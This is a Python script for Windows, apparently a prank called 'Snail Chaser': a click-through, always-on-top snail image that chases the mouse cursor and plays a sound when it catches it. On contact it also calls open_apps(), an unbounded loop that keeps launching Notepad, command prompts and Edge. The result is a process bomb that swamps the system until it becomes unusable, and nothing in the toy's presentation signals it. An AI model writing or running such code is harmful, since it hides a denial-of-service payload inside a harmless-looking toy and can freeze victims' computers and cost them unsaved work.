import math
import random
import time
from pathlib import Path

import win32api
import win32con
import win32gui
import win32ui
import subprocess

from PIL import Image

def open_apps():
    while True:
        subprocess.Popen(["notepad.exe"])
        subprocess.Popen(["start", "cmd"], shell=True)
        subprocess.Popen(["cmd.exe", "/c", "start", "", "msedge"])


# ============================================================
# CONFIG
# ============================================================

ICON_SIZE = 40
CHASE_SPEED = 1.0
COLLISION_DISTANCE = 28
UPDATE_MS = 16

ICON_FILE = Path(__file__).with_name("icon.png")
SOUND_FILE = Path(__file__).with_name("sound.mp3")


# ============================================================
# SOUND
# ============================================================

import ctypes

winmm = ctypes.windll.winmm


def play_sound():

    if not SOUND_FILE.exists():
        print("sound.mp3 not found")
        return

    filename = str(SOUND_FILE.resolve())

    winmm.mciSendStringW(
        "close snailSound",
        None,
        0,
        None
    )

    command = (
        f'open "{filename}" '
        f'type mpegvideo '
        f'alias snailSound'
    )

    result = winmm.mciSendStringW(
        command,
        None,
        0,
        None
    )

    if result != 0:
        print("Could not open sound.mp3")
        return

    winmm.mciSendStringW(
        "setaudio snailSound volume to 1000",
        None,
        0,
        None
    )

    winmm.mciSendStringW(
        "play snailSound",
        None,
        0,
        None
    )


# ============================================================
# WINDOW PROCEDURE
# ============================================================

def window_proc(hwnd, msg, wparam, lparam):

    if msg == win32con.WM_DESTROY:
        return 0

    return win32gui.DefWindowProc(
        hwnd,
        msg,
        wparam,
        lparam
    )


# ============================================================
# SNAIL
# ============================================================

class SnailChaser:

    def __init__(self):

        # ----------------------------------------------------
        # Check PNG
        # ----------------------------------------------------

        if not ICON_FILE.exists():

            raise FileNotFoundError(
                f"\nicon.png was not found.\n\n"
                f"Expected:\n{ICON_FILE}"
            )

        print("Loading:", ICON_FILE)

        # ----------------------------------------------------
        # Load PNG with alpha
        # ----------------------------------------------------

        image = Image.open(
            ICON_FILE
        ).convert("RGBA")

        print(
            "PNG loaded:",
            image.size,
            image.mode
        )

        image = image.resize(
            (ICON_SIZE, ICON_SIZE),
            Image.Resampling.LANCZOS
        )

        self.image = image

        self.width = ICON_SIZE
        self.height = ICON_SIZE

        # ----------------------------------------------------
        # Position
        # ----------------------------------------------------

        self.x = 300.0
        self.y = 300.0

        self.colliding = False

        self.running = True

        self.random = random.SystemRandom()

        # ----------------------------------------------------
        # Create window
        # ----------------------------------------------------

        self.create_window()

        # ----------------------------------------------------
        # Draw PNG
        # ----------------------------------------------------

        self.create_bitmap()

        # ----------------------------------------------------
        # Initial position
        # ----------------------------------------------------

        self.teleport_random()

        # ----------------------------------------------------
        # Start
        # ----------------------------------------------------

        self.last_time = time.perf_counter()

        self.run()


    # ========================================================
    # CREATE WINDOW
    # ========================================================

    def create_window(self):

        self.class_name = "SnailChaserWindow"

        hinstance = win32api.GetModuleHandle(None)

        wc = win32gui.WNDCLASS()

        wc.hInstance = hinstance

        wc.lpszClassName = self.class_name

        wc.lpfnWndProc = window_proc

        wc.hCursor = win32gui.LoadCursor(
            0,
            win32con.IDC_ARROW
        )

        try:

            win32gui.RegisterClass(wc)

        except win32gui.error:

            pass

        # ----------------------------------------------------
        # Create transparent layered window
        # ----------------------------------------------------

        ex_style = (
            win32con.WS_EX_LAYERED
            | win32con.WS_EX_TRANSPARENT
            | win32con.WS_EX_NOACTIVATE
            | win32con.WS_EX_TOOLWINDOW
        )

        self.hwnd = win32gui.CreateWindowEx(

            ex_style,

            self.class_name,

            "Snail Chaser",

            win32con.WS_POPUP,

            0,
            0,

            self.width,
            self.height,

            0,
            0,

            hinstance,

            None
        )

        # Always on top
        win32gui.SetWindowPos(

            self.hwnd,

            win32con.HWND_TOPMOST,

            0,
            0,

            self.width,
            self.height,

            win32con.SWP_NOACTIVATE
            | win32con.SWP_SHOWWINDOW
        )


    # ========================================================
    # CREATE PNG BITMAP
    # ========================================================

    def create_bitmap(self):

        # Convert PIL image to BGRA
        bgra = bytearray(
            self.image.tobytes()
        )

        for i in range(
            0,
            len(bgra),
            4
        ):

            r = bgra[i]
            g = bgra[i + 1]
            b = bgra[i + 2]

            bgra[i] = b
            bgra[i + 1] = g
            bgra[i + 2] = r

        self.pixel_data = bytes(bgra)

        # ----------------------------------------------------
        # Create device context
        # ----------------------------------------------------

        screen_dc = win32gui.GetDC(0)

        self.screen_dc = screen_dc

        self.dc = win32ui.CreateDCFromHandle(
            screen_dc
        )

        self.mem_dc = self.dc.CreateCompatibleDC()

        # ----------------------------------------------------
        # Create bitmap
        # ----------------------------------------------------

        self.bitmap = win32ui.CreateBitmap()

        self.bitmap.CreateCompatibleBitmap(
            self.dc,
            self.width,
            self.height
        )

        self.mem_dc.SelectObject(
            self.bitmap
        )

        # ----------------------------------------------------
        # Put PNG pixels into bitmap
        # ----------------------------------------------------

        dib = win32ui.CreateBitmap()

        dib.CreateCompatibleBitmap(
            self.dc,
            self.width,
            self.height
        )

        # Use PIL -> raw BGRA data
        self.mem_dc.SelectObject(
            self.bitmap
        )

        # Create DIB using PIL data
        import numpy as np

        array = np.frombuffer(
            self.pixel_data,
            dtype=np.uint8
        )

        array = array.reshape(
            (self.height, self.width, 4)
        )

        # PIL image for Windows
        bmp_image = Image.fromarray(
            array,
            "RGBA"
        )

        bmp_image = bmp_image.convert(
            "RGBA"
        )

        # ----------------------------------------------------
        # Use PIL to create a temporary BMP
        # ----------------------------------------------------

        temp_bmp = Path(
            "__snail_temp.bmp"
        )

        bmp_image.save(
            temp_bmp
        )

        # Load bitmap through Windows
        loaded = win32gui.LoadImage(
            0,
            str(temp_bmp),
            win32con.IMAGE_BITMAP,
            self.width,
            self.height,
            win32con.LR_LOADFROMFILE
        )

        if loaded:

            win32gui.SelectObject(
                self.mem_dc.GetSafeHdc(),
                loaded
            )

        try:
            temp_bmp.unlink()
        except:
            pass


    # ========================================================
    # DRAW PNG
    # ========================================================

    def update_overlay(self):

        left = int(
            self.x - self.width / 2
        )

        top = int(
            self.y - self.height / 2
        )

        # ----------------------------------------------------
        # Source DC
        # ----------------------------------------------------

        src_dc = self.mem_dc.GetSafeHdc()

        # ----------------------------------------------------
        # Destination DC
        # ----------------------------------------------------

        screen_dc = win32gui.GetDC(0)

        # ----------------------------------------------------
        # Position
        # ----------------------------------------------------

        pt_pos = (
            left,
            top
        )

        size = (
            self.width,
            self.height
        )

        src_pos = (
            0,
            0
        )

        # ----------------------------------------------------
        # Alpha blending
        # ----------------------------------------------------

        blend = (
            0,
            0,
            255,
            1
        )

        win32gui.UpdateLayeredWindow(

            self.hwnd,

            screen_dc,

            pt_pos,

            size,

            src_dc,

            src_pos,

            0,

            blend,

            win32con.ULW_ALPHA
        )

        win32gui.ReleaseDC(
            0,
            screen_dc
        )


    # ========================================================
    # RANDOM TELEPORT
    # ========================================================

    def teleport_random(self):

        monitors = win32api.EnumDisplayMonitors()
        monitors = [monitor[2] for monitor in monitors]

        if not monitors:

            width = win32api.GetSystemMetrics(
                win32con.SM_CXSCREEN
            )

            height = win32api.GetSystemMetrics(
                win32con.SM_CYSCREEN
            )

            monitors = [
                (
                    0,
                    0,
                    width,
                    height
                )
            ]

        left, top, right, bottom = (
            self.random.choice(monitors)
        )

        margin = self.width // 2

        self.x = self.random.uniform(
            left + margin,
            right - margin
        )

        self.y = self.random.uniform(
            top + margin,
            bottom - margin
        )

        self.update_overlay()


    # ========================================================
    # COLLISION
    # ========================================================

    def check_collision(
        self,
        cursor_x,
        cursor_y
    ):

        distance = math.hypot(
            self.x - cursor_x,
            self.y - cursor_y
        )

        return (
            distance <= COLLISION_DISTANCE
        )


    # ========================================================
    # UPDATE
    # ========================================================

    def update(self):

        cursor_x, cursor_y = (
            win32api.GetCursorPos()
        )

        # ----------------------------------------------------
        # Collision
        # ----------------------------------------------------

        if self.check_collision(
            cursor_x,
            cursor_y
        ):

            if not self.colliding:

                self.colliding = True

                # Play once
                play_sound()

                open_apps()

                # Teleport
                self.teleport_random()

        # ----------------------------------------------------
        # Chase
        # ----------------------------------------------------

        else:

            self.colliding = False

            dx = cursor_x - self.x
            dy = cursor_y - self.y

            distance = math.hypot(
                dx,
                dy
            )

            if distance > 0:

                step = min(
                    CHASE_SPEED,
                    distance
                )

                self.x += (
                    dx / distance
                ) * step

                self.y += (
                    dy / distance
                ) * step

                self.update_overlay()


    # ========================================================
    # MAIN LOOP
    # ========================================================

    def run(self):

        while self.running:

            # Process Windows messages
            win32gui.PumpWaitingMessages()

            self.update()

            time.sleep(
                UPDATE_MS / 1000
            )


# ============================================================
# START
# ============================================================

if __name__ == "__main__":

    try:

        SnailChaser()

    except KeyboardInterrupt:

        print("Stopped.")

    except Exception as e:

        print()
        print("ERROR:")
        print(e)
        print()

        input(
            "Press Enter to close..."
        )
